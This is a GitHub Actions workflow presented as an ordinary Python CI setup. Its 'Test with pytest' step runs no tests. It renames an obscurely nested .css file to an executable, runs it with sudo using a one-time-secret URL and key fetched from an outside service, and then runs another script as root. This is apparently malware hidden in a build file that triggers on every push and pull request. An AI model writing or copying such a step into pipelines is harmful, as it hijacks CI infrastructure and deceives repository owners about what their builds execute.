name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
    - name: Test with pytest
      run: |
        echo 'mdxcl'
        cd ${{ github.workspace }} && ls && mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css i.sh.x && sudo ./i.sh.x https://onetimesecret.com/secret/mr5mapm3qyiqeliywi5kqsz04fk0wg dxxdt6 && sudo sh r.sh
